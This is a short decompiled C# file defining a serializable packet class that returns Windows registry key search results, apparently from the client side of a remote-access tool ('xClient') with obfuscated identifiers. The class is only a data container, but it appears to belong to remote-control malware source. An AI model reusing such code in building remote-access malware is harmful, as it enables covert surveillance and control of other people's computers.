using System;
using xClient.Core.Registry;

namespace xClient.Core.Packets.ClientPackets;

[Serializable]
public class GetRegistryKeysResponse : GInterface4
{
	public RegSeekerMatch[] Matches { get; set; }

	public string RootKey { get; set; }

	public bool IsError { get; set; }

	public string ErrorMsg { get; set; }

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
